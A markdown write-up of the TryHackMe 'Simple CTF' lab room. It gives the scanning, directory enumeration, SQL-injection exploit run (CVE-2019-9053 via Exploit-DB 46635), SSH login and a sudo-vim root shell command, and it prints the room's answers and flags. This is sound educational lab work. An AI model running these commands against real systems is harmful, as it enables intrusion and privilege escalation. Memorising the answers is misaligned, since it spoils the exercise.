# Try Hack Me Writeup - Simple CTF

- TryHackMe Room : <https://tryhackme.com/room/easyctf>


![alt text]( images/simple-ctf-logo.png "simple ctf room Image")


Write-up and walkthrough of the TryHackMe ‘Simple CTF’ room, including step-by-step exploitation process with screenshots.

# Tools Used
- `nmap`
- `gobuster`
- `searchsploit`

## 1. How many services are running under port 1000?

To find ports below 1000 we can use - `nmap -p 1-1000 TARGET-IP`

![alt text]( images/q-1-1.png "Q1 Image")

We can see there is 2 ports are running under port 1000

```commandline
2
```

## 2. What is running on the higher port?

To find that we can perform simple nmap scans 
- `nmap TARGET-IP`
- `nmap -sV -p 1-2222 TARGET-IP`

![alt text]( images/q-2-2.png "Q 2 Image" )

We can see SSH are running 

```commandline
SSH
```

## 3. What's the CVE you're using against the application?

I discovered a hidden directory with - `gobuster`
- `gobuster dir -u http://10.201.44.135/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 10`

![alt text]( images/q-3-3.png "Q 3 Image" )

You can see in the image that I found a hidden directory - `/simple`
then I visit this url  -`TARGET-IP/simple`

![alt text]( images/q-3-4.png "Q 3 Image" )

You can see that i found in the bottom - `CMS Made Simple version 2.2.8` then i simply search it on google

![alt text]( images/q-3-5.png "Q 3 Image" )

```commandline
CVE-2019-9053
```

## 4. To what kind of vulnerability is the application vulnerable?

From the Exploit-DB page we can see the application is vulnerable to - `SQL injection`

```commandline
SQLI
```

## 5. What's the password?

You can see in exploit.db we have EDB-ID - `46635`
Now we have to save this exploit on our attacker machine USE: - `searchsploit -m 46635`

![alt text]( images/q-5-6.png "Q 3 Image" )

After that run the exploit with the command below:
- `python2 46635.py -u TARGET-IP/simple/ --crack -w /usr/share/wordlists/rockyou.txt`

![alt text]( images/q-5-7.png "Q 3 Image" )

After running that command it takes some time to find the username, password and email (it takes ~2–3 minutes) 

```commandline
secret
```

## 6. Where can you login with the details obtained?

Now you have the username and password — use them to SSH in
- `ssh mitch@TARGET-IP`
Enter the password - `secret`

```commandline
SSH
```

## 7. What's the user flag?

You can find the file - `user.txt` open it with - `cat` 

```commandline
G00d j0b, keep up!
```

## 8. Is there any other user in the home directory? What's its name?

To find other user go to home directory - `cd /home`
Then you can see other user 

```commandline
sunbath
```

## 9. What can you leverage to spawn a privileged shell?

We can use vim to spawn a privileged shell. I found this command on 'https://gtfobins.github.io/gtfobins/vim/'
- `sudo vim -c ':!/bin/sh'`

![alt text]( images/q-9-9.png "Q 3 Image" )

```commandline
vim
```

## 10. What's the root flag?

I discovered that user mitch can run /usr/bin/vim as root without a password (- `sudo -l showed NOPASSWD: /usr/bin/vim`). I abused this by spawning a root shell with - `sudo vim -c ':!/bin/sh'`, which dropped me to a root shell (uid=0). From there I changed to /root and read the flag file: -`cat /root/root.txt`

![alt text]( images/q-10-10.png "Q 3 Image" )

```commandline
W3ll d0n3. You made it!
```

## Conclusion

This writeup documents the full exploitation of the TryHackMe "Simple CTF" room . I discovered a CMS Made Simple instance (v2.2.8) and used CVE-2019-9053 to recover credentials, logged in via SSH, and escalated to root by abusing a sudo Vim configuration to read both user and root flags.

Artifacts (screenshots, commands) are included in the repository under `/images`. This work is for educational purposes only — thanks to TryHackMe and the authors of the public exploits used.
